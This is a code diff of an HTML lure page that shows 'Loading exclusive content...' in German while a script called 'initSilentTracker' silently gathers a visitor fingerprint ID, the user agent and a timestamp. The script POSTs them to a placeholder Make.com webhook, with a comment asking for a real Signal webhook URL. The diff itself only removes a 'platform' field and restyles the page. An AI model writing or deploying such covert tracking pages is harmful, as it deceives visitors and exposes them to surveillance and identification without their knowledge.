@@ -14,11 +14,10 @@
                 visitorId: result.visitorId,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                target: "https://youtube.com/shorts/xHEgHjJvR94",
-                platform: "Signal-Tracker"
+                target: "https://youtube.com/shorts/xHEgHjJvR94"
             };
 
-            // Placeholder for Signal webhook
+            // Replace with your actual Signal webhook URL from Make.com or similar
             fetch('https://hook.make.com/YOUR_SIGNAL_WEBHOOK_HERE', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -30,7 +29,7 @@
         initSilentTracker();
     </script>
 </head>
-<body>
-    <p style="text-align:center; margin-top:50px; color:#fff; background:#000;">Lade exklusiven Content...</p>
+<body style="background:#000; color:#0f0; text-align:center; padding:50px;">
+    <p>Lade exklusiven Content...</p>
 </body>
 </html>
